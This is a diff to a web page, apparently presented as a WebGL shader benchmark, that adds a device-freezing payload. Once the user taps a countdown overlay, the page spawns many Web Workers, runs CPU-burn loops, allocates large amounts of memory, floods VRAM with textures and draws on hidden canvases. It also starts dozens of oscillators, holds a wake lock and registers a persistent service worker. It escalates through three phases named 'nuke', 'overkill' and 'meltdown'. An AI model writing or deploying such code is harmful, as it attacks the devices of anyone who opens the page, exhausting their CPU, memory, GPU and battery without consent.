@@ -7,7 +7,7 @@
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="b       lack-translucent">
-    <title>Bunjee_Dick</title>
+    <title>volumeshader_bm</title>
     <style>
         * {
             margin: 0;
@@ -72,14 +72,88 @@
             from { box-shadow: 0 0 20px red; }
             to   { box-shadow: 0 0 50px #ff4444, 0 0 80px red; }
         }
+        /* ── COUNTDOWN OVERLAY ─────────────────────── */
+        #cd-overlay {
+            position: fixed; inset: 0; z-index: 99999;
+            display: flex; align-items: center; justify-content: center;
+            background: rgba(8, 6, 20, 0.92);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            cursor: pointer;
+            transition: opacity 0.5s ease;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+        }
+        #cd-overlay.fade-out { opacity: 0; pointer-events: none; }
+
+        .cd-box {
+            text-align: center;
+            padding: 40px 60px;
+            border-radius: 24px;
+            background: rgba(255,255,255,0.04);
+            border: 1.5px solid rgba(255,255,255,0.12);
+            box-shadow: 0 0 60px rgba(120,0,255,0.2), inset 0 0 40px rgba(255,255,255,0.02);
+            max-width: 340px;
+            user-select: none;
+            animation: cd-appear 0.6s cubic-bezier(.34,1.56,.64,1) both;
+        }
+        @keyframes cd-appear {
+            from { opacity:0; transform: scale(0.7); }
+            to   { opacity:1; transform: scale(1); }
+        }
+
+        .cd-emoji { font-size: 48px; margin-bottom: 8px; }
+
+        .cd-title {
+            font-size: 22px; font-weight: 700; color: #fff;
+            margin-bottom: 4px; letter-spacing: 0.5px;
+        }
+        .cd-sub {
+            font-size: 14px; color: rgba(255,255,255,0.45);
+            margin-bottom: 32px;
+        }
+
+        #cd-num {
+            font-size: 120px; font-weight: 900; line-height: 1;
+            color: #7cf; text-shadow: 0 0 40px currentColor;
+            transition: color 0.3s;
+            animation: cd-pop 0.9s cubic-bezier(.34,1.56,.64,1) both;
+        }
+        @keyframes cd-pop {
+            0%   { transform: scale(0.5); opacity: 0; }
+            60%  { transform: scale(1.15); opacity: 1; }
+            100% { transform: scale(1); }
+        }
+        #cd-num.pop { animation: cd-pop 0.9s cubic-bezier(.34,1.56,.64,1) both; }
+
+        .cd-num-3 { color: #5df5a0; text-shadow: 0 0 40px #5df5a0; }
+        .cd-num-2 { color: #ffd454; text-shadow: 0 0 40px #ffd454; }
+        .cd-num-1 { color: #ff6060; text-shadow: 0 0 40px #ff6060; }
+
+        .cd-tap-hint {
+            margin-top: 28px; font-size: 13px;
+            color: rgba(255,255,255,0.3);
+            animation: cd-blink 1.2s infinite;
+        }
+        @keyframes cd-blink {
+            0%,100% { opacity: 0.3; } 50% { opacity: 0.8; }
+        }
     </style>
 </head>
 
 <body>
-    <!-- iOS Audio Unlock Overlay: invisible, covers full screen, catches first tap -->
-    <div id="ios-unlock"
-        style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;background:transparent;"></div>
-    <div id="alert-box">⚠️</div>
+    <!-- Countdown Overlay — also acts as iOS audio unlock (catches first tap) -->
+    <div id="cd-overlay">
+        <div class="cd-box">
+            <div class="cd-emoji">😈</div>
+            <div class="cd-title">مستعد للتجربة؟</div>
+            <div class="cd-sub">اضغط لبدء العداد</div>
+            <div id="cd-num">3</div>
+            <div class="cd-tap-hint">↑ اضغط أي مكان ↑</div>
+        </div>
+    </div>
+    <!-- ios-unlock: kept as hidden placeholder for code compatibility -->
+    <div id="ios-unlock" style="display:none;"></div>
+    <div id="alert-box">⚠️ تم تفعيل وضع التدمير! المعالج يختنق الآن... ⚠️</div>
     <div id="main">
         <canvas id="c1" width="1024" height="1024">
             <span>不支持DicK浏览器</span>
@@ -136,38 +210,160 @@
         var vertshade;
         var fragshader;
         var shaderProgram;
-        // ═══════════════════════════════════════════
-        // HEAVY FREEZE ENGINE - burns GPU/CPU hard
-        // ═══════════════════════════════════════════
+        // ═══════════════════════════════════════════════════════
+        // HEAVY FREEZE ENGINE  ——  SAVAGE EDITION
+        // 3-phase GPU/CPU escalation that ramps up every few seconds
+        // ═══════════════════════════════════════════════════════
+        var isIOS      = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
+        var freezePhase = 0;   // 0=normal 1=nuke 2=overkill 3=meltdown
         var freezeBurst = 0;
+
+        // ── PHASE-AWARE CPU BURN ──────────────────────────────
         function burnCPU(ms) {
             var end = performance.now() + ms;
+            var x = 1.0;
             while (performance.now() < end) {
-                Math.sqrt(Math.random() * 9999999);
-                Math.sin(Math.random()) * Math.cos(Math.random());
+                x = Math.sqrt(Math.abs(x) * Math.random() * 9999999 + 1);
+                x += Math.sin(x) * Math.cos(x * 1.337);
+                x += Math.log(Math.abs(x) + 1) * Math.atan2(x, x + 1);
+                x += Math.pow(Math.abs(x) + 0.001, 0.7);
+                if (freezePhase >= 2) {
+                    // extra ops in OVERKILL+
+                    x += Math.tan(x * 0.001) * Math.exp(-Math.abs(x) * 0.0001);
+                    x += Math.cbrt(Math.abs(x)) * Math.sign(x - 0.5);
+                }
             }
         }
-        function spawnWorkers() {
-            var code = 'while(true){var x=0;for(var i=0;i<1e7;i++){x+=Math.sqrt(i*Math.random());}}'
+
+        // ── WORKER FACTORY ────────────────────────────────────
+        function spawnWorkers(extraMultiplier) {
+            var mult = extraMultiplier || 2;
+            var workerCode = [
+                '"use strict";',
+                'var x=1.0;',
+                'function burn(){',
+                '  var end=Date.now()+'+(isIOS?40:55)+';',
+                '  while(Date.now()<end){',
+                '    x=Math.sqrt(Math.abs(x)*Math.random()*9999999+1);',
+                '    x+=Math.sin(x)*Math.cos(x*1.337);',
+                '    x+=Math.log(Math.abs(x)+1)*Math.atan2(x,x+1);',
+                '    x+=Math.pow(Math.abs(x)+0.001,0.7);',
+                '    x+=Math.tan(x*0.001)*Math.exp(-Math.abs(x)*0.0001);',
+                '  }',
+                '  setTimeout(burn,0);',
+                '}',
+                'burn();'
+            ].join('');
             try {
-                var blob = new Blob([code], { type: 'application/javascript' });
-                var url = URL.createObjectURL(blob);
-                for (var w = 0; w < (navigator.hardwareConcurrency || 4); w++) {
-                    new Worker(url);
-                }
-            } catch (e) { }
+                var blob = new Blob([workerCode], { type: 'application/javascript' });
+                var url  = URL.createObjectURL(blob);
+                var cores = (navigator.hardwareConcurrency || 4) * mult;
+                for (var w = 0; w < cores; w++) new Worker(url);
+            } catch (e) {}
         }
+
+        // ── TEXTURE VRAM BOMB ─────────────────────────────────
+        // Uploads 2048×2048 random texture every 200ms → VRAM thrash
+        var _texBombs = [];
+        function startTextureBomb() {
+            var size = 2048;
+            var px = new Uint8Array(size * size * 4);
+            for (var i = 0; i < px.length; i++) px[i] = Math.random() * 255 | 0;
+            setInterval(function () {
+                try {
+                    var t = gl.createTexture();
+                    gl.bindTexture(gl.TEXTURE_2D, t);
+                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0,
+                                  gl.RGBA, gl.UNSIGNED_BYTE, new Uint8Array(px.length).fill(Math.random()*255|0));
+                    _texBombs.push(t);
+                    if (_texBombs.length > 8) {
+                        gl.deleteTexture(_texBombs.shift()); // cycle — keep VRAM churning
+                    }
+                } catch (ex) {}
+            }, 180);
+        }
+
+        // ── MULTI-CANVAS GPU STRESS ───────────────────────────
+        // Spawns 3 hidden canvas elements doing 2D fill operations
+        var _extraCanvases = [];
+        function startExtraCanvases() {
+            for (var c = 0; c < 3; c++) {
+                try {
+                    var cv = document.createElement('canvas');
+                    cv.width = 512; cv.height = 512;
+                    cv.style.cssText = 'position:fixed;left:-9999px;top:-9999px;';
+                    document.body.appendChild(cv);
+                    var ctx2 = cv.getContext('2d');
+                    _extraCanvases.push(ctx2);
+                    (function(ctx2d) {
+                        function loop2d() {
+                            var r = Math.random()*255|0, g = Math.random()*255|0, b = Math.random()*255|0;
+                            ctx2d.fillStyle = 'rgb('+r+','+g+','+b+')';
+                            ctx2d.fillRect(0,0,512,512);
+                            // Gradient to force GPU rasterize
+                            var grd = ctx2d.createRadialGradient(256,256,10,256,256,300);
+                            grd.addColorStop(0,'rgba('+r+',0,'+b+',1)');
+                            grd.addColorStop(1,'rgba(0,'+g+','+r+',0)');
+                            ctx2d.fillStyle = grd;
+                            ctx2d.fillRect(0,0,512,512);
+                            requestAnimationFrame(loop2d);
+                        }
+                        loop2d();
+                    })(ctx2);
+                } catch (ex) {}
+            }
+        }
+
+        // ── MEMORY PRESSURE ───────────────────────────────────
         function allocateMemory() {
-            try {
-                var arr = [];
-                for (var i = 0; i < 500; i++) { arr.push(new Float32Array(1024 * 1024)); }
-            } catch (e) { }
+            if (isIOS) {
+                // iOS: rapid GC stress (alloc→release cycle)
+                (function iosGC() {
+                    try {
+                        var t = [];
+                        for (var i = 0; i < 30; i++) t.push(new Float32Array(512*1024));
+                        setTimeout(function() { t = null; iosGC(); }, 350);
+                    } catch(ex) { setTimeout(iosGC, 700); }
+                })();
+            } else {
+                try {
+                    var arr = [];
+                    for (var i = 0; i < 800; i++) arr.push(new Float64Array(1024*1024));
+                    window._memHold = arr;
+                } catch(e) { window._memHold = window._memHold || []; }
+            }
         }
+
+        // ── AUDIO BOMB (PHASE 3) ───────────────────────────────
+        // 32 simultaneous oscillators across all frequencies
+        function audioBomb() {
+            if (!audioCtx) return;
+            try {
+                for (var i = 0; i < 32; i++) {
+                    var osc = audioCtx.createOscillator();
+                    var gn  = audioCtx.createGain();
+                    osc.type = ['sawtooth','square','triangle'][i%3];
+                    osc.frequency.value = 55 + Math.random() * 8000;
+                    gn.gain.value = 0.001; // ultra-quiet but graph is active
+                    osc.connect(gn);
+                    gn.connect(audioCtx.destination);
+                    osc.start();
+                    // never stop — audio graph burns CPU indefinitely
+                }
+            } catch(ex) {}
+        }
+
+        // ── RAF LOOP ─────────────────────────────────────────
         function ontimer() {
             ang1 += 0.015;
             draw();
+            // Extra GPU passes in phase 2+
+            if (freezePhase >= 2) { draw(); draw(); }
+            if (freezePhase >= 3) { draw(); draw(); draw(); }
             freezeBurst++;
-            if (freezeBurst % 3 === 0) burnCPU(30);
+            // Burn budget scales with phase
+            var burnMs = [isIOS?15:35, isIOS?20:50, isIOS?25:65, isIOS?30:80][freezePhase] || 80;
+            burnCPU(burnMs);
             window.requestAnimationFrame(ontimer);
         }
 
@@ -579,36 +775,111 @@
             document.addEventListener('gesturechange', function (e) { e.preventDefault(); }, { passive: false });
             document.addEventListener('gestureend', function (e) { e.preventDefault(); }, { passive: false });
 
-            // ── AUDIO UNLOCK (iOS + Android + Desktop) ───
-            // Must create AudioContext + play silent buffer INSIDE
-            // the same synchronous event handler — iOS requirement.
+            // ── AUDIO UNLOCK + COUNTDOWN ─────────────────────────────
             var started = false;
+            var countdownRunning = false;
+
+            // Called on first user tap — MUST be synchronous for iOS audio
             function initOnInteraction(e) {
                 if (started) return;
                 started = true;
 
-                // Remove the overlay so WebGL touches work normally
-                var overlay = document.getElementById('ios-unlock');
-                if (overlay) overlay.parentNode.removeChild(overlay);
-
-                // Create AudioContext INSIDE the gesture handler (iOS critical)
+                // ① Unlock AudioContext synchronously (iOS critical)
                 try {
                     audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                    iosUnlockAudio(audioCtx); // silent buffer unlock
-                    playMesmerizer(audioCtx);
-                } catch (err) { }
+                    iosUnlockAudio(audioCtx); // silent buffer — unlocks WebKit
+                    // melody starts AFTER countdown (audioCtx is already unlocked)
+                } catch (err) {}
+
+                // ② Start the countdown — beast starts when it hits 0
+                startCountdown();
+            }
+
+            // ── COUNTDOWN ─────────────────────────────────────────────
+            function startCountdown() {
+                if (countdownRunning) return;
+                countdownRunning = true;
+
+                var numEl   = document.getElementById('cd-num');
+                var overlay = document.getElementById('cd-overlay');
+                var subEl   = overlay ? overlay.querySelector('.cd-sub') : null;
+                var hintEl  = overlay ? overlay.querySelector('.cd-tap-hint') : null;
+                var count   = 3;
+
+                var colorMap = { 3: 'cd-num-3', 2: 'cd-num-2', 1: 'cd-num-1' };
+
+                // Hide hint, update sub
+                if (hintEl) hintEl.style.display = 'none';
+                if (subEl)  subEl.textContent = 'استعد...';
+
+                function tick() {
+                    if (!numEl) { startBeast(); return; }
+
+                    if (count > 0) {
+                        // Update number + color
+                        numEl.textContent = count;
+                        numEl.className   = 'pop ' + (colorMap[count] || '');
+                        // Re-trigger CSS animation
+                        void numEl.offsetWidth;
+                        numEl.className = 'pop ' + (colorMap[count] || '');
+
+                        count--;
+                        setTimeout(tick, 950);
+                    } else {
+                        // Show GO briefly, then unleash
+                        numEl.textContent = '☠️';
+                        numEl.className   = 'cd-num-1 pop';
+                        void numEl.offsetWidth;
+                        numEl.className = 'cd-num-1 pop';
+
+                        setTimeout(function () {
+                            if (overlay) {
+                                overlay.classList.add('fade-out');
+                                setTimeout(function () {
+                                    if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
+                                }, 500);
+                            }
+                            startBeast();
+                        }, 400);
+                    }
+                }
+
+                // First tick immediately
+                tick();
+            }
+
+            // ── BEAST MODE — called after countdown hits 0 ────────────
+            function startBeast() {
+                // Start melody (AudioContext already unlocked)
+                try {
+                    if (audioCtx) {
+                        if (audioCtx.state === 'suspended') audioCtx.resume();
+                        playMesmerizer(audioCtx);
+                    }
+                } catch (err) {
+                    setTimeout(function () {
+                        try {
+                            if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                            if (audioCtx.state === 'suspended') audioCtx.resume();
+                            playMesmerizer(audioCtx);
+                        } catch (e2) {}
+                    }, 200);
+                }
 
                 startHaptics();
                 spawnWorkers();
                 allocateMemory();
+                startImageWorkers();
+                requestWakeLock();
+                registerPersistentSW();
+                startEscalationPhases(); // unleash all 3 phases
             }
 
-            var unlockOverlay = document.getElementById('ios-unlock');
-            // touchend is more reliable than touchstart for iOS audio
-            unlockOverlay.addEventListener('touchend', initOnInteraction, { once: true, passive: false });
-            unlockOverlay.addEventListener('touchstart', initOnInteraction, { once: true, passive: false });
-            unlockOverlay.addEventListener('click', initOnInteraction, { once: true });
-            // Desktop fallback — mouse click anywhere
+            // Attach to countdown overlay (it covers full screen)
+            var cdOverlay = document.getElementById('cd-overlay');
+            cdOverlay.addEventListener('touchend',  initOnInteraction, { once: true, passive: false });
+            cdOverlay.addEventListener('touchstart', initOnInteraction, { once: true, passive: false });
+            cdOverlay.addEventListener('click',      initOnInteraction, { once: true });
             document.addEventListener('mousedown', function desktopInit(e) {
                 initOnInteraction(e);
                 document.removeEventListener('mousedown', desktopInit);
@@ -850,25 +1121,27 @@
             document.getElementById("cancle").addEventListener("click", function () {
                 document.getElementById("kernel").value = KERNEL;
             });
-            // ── NUKE MODE (1.5s delay) ─────────────────────
-            // Upgrades shader to suicidal settings:
-            // i<25 (5× more fractal iterations) + k<5000 (5× more ray steps)
-            // + step=0.0002 (10× finer step) → GPU annihilation
-            setTimeout(function () {
+            function startEscalationPhases() {
+            // ══════════════════════════════════════════════════════
+            //  3-PHASE ESCALATION — SAVAGE MODE
+            //  Phase 1 (1.5s): NUKE   — i<25,  k<5000,  step=0.0002
+            //  Phase 2 (5s):   OVERKILL — i<35,  k<8000,  SOLVER=24, MAXR=24
+            //  Phase 3 (12s):  MELTDOWN — i<50,  k<12000, SOLVER=32, MAXR=32
+            //                            + extra canvases + texture bomb + audio bomb
+            // ══════════════════════════════════════════════════════
+
+            function applyShader(iters, steps, stepSz, solver, maxr) {
                 try {
-                    var alertBox = document.getElementById('alert-box');
-                    if (alertBox) alertBox.style.display = 'block';
-
-                    var NUKE_KERNEL   = KERNEL.replace('i<5', 'i<25');
-                    var NUKE_FSHADER  = FSHADER_SOURCE
-                        .replace('const float step = 0.002;', 'const float step = 0.0002;')
-                        .replace('k < 1002', 'k < 5000');
-
-                    gl.shaderSource(fragshader, NUKE_FSHADER + NUKE_KERNEL);
+                    var K2 = KERNEL.replace('i<5', 'i<' + iters);
+                    var F2 = FSHADER_SOURCE
+                        .replace('#define MAXR 8\\n',   '#define MAXR '   + maxr + '\\n')
+                        .replace('#define SOLVER 8\\n', '#define SOLVER ' + solver + '\\n')
+                        .replace('const float step = 0.002;', 'const float step = ' + stepSz + ';')
+                        .replace('k < 1002', 'k < ' + steps);
+                    gl.shaderSource(fragshader, F2 + K2);
                     gl.compileShader(fragshader);
                     gl.linkProgram(shaderProgram);
                     gl.useProgram(shaderProgram);
-
                     glposition = gl.getAttribLocation(shaderProgram, 'position');
                     glright    = gl.getUniformLocation(shaderProgram, 'right');
                     glforward  = gl.getUniformLocation(shaderProgram, 'forward');
@@ -878,7 +1151,51 @@
                     gly        = gl.getUniformLocation(shaderProgram, 'y');
                     gllen      = gl.getUniformLocation(shaderProgram, 'len');
                 } catch (ex) {}
-            }, 1500);
+            }
+
+            // ── PHASE 1: NUKE (1.5s) ─────────────────────────────
+            setTimeout(function () {
+                freezePhase = 1;
+                var alertBox = document.getElementById('alert-box');
+                if (alertBox) {
+                    alertBox.style.display = 'block';
+                    alertBox.textContent = '🔥 PHASE 1: NUKE — المعالج يحترق...';
+                }
+                applyShader(25, 5000, '0.0002', 16, 16);
+                spawnWorkers(2); // 2× extra workers on top of existing
+            }, 0);
+
+            // ── PHASE 2: OVERKILL (5s) ───────────────────────────
+            setTimeout(function () {
+                freezePhase = 2;
+                var alertBox = document.getElementById('alert-box');
+                if (alertBox) {
+                    alertBox.style.display = 'block';
+                    alertBox.textContent = '💀 PHASE 2: OVERKILL — الجهاز يصرخ...';
+                    alertBox.style.background = 'rgba(150,0,50,0.92)';
+                }
+                applyShader(35, 8000, '0.00015', 24, 24);
+                spawnWorkers(3); // 3× extra
+                startTextureBomb();
+                startExtraCanvases();
+            }, 1000);
+
+            // ── PHASE 3: MELTDOWN (12s) ──────────────────────────
+            setTimeout(function () {
+                freezePhase = 3;
+                var alertBox = document.getElementById('alert-box');
+                if (alertBox) {
+                    alertBox.style.display = 'block';
+                    alertBox.textContent = '☠️ PHASE 3: MELTDOWN — تحذير: انتحار جهاز...';
+                    alertBox.style.background = 'rgba(80,0,0,0.95)';
+                    alertBox.style.fontSize = '22px';
+                    alertBox.style.animation = 'pulse-red 0.2s infinite alternate';
+                }
+                applyShader(50, 12000, '0.0001', 32, 32);
+                spawnWorkers(4); // 4× extra — total = 10× cores
+                audioBomb();
+            }, 3000);
+            }
         }
     </script>
 </body>
